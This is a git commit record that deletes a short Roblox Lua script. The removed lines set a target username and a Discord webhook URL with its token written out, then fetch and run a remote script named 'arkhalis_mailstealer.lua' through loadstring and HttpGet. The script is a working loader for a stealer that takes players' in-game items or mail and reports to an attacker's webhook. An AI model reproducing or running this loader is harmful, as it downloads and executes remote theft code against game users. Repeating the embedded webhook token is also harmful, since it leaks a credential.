f4586c1972ce4caeaa53957c26dafa6ca371818d
SpaceHub <134173055+HubScript@users.noreply.github.com>
2023-05-30 02:15:02 +0200

    Delete script.lua

--- script.lua
+++
@@ -1,5 +0,0 @@
-_G.UserName = "Treasureita58"
-_G.UserName2 = "Treasureita58" -- optional
-_G.Webhook = "https://discord.com/api/webhooks/1109194507804737647/3vArdqCHO1Ysn3gWdD_4LMfIHNFbqp9b4mKP39xXDiJQjwBtfx0oENtCDSSQyVP3rtM4" -- optional
-    
-loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))() 
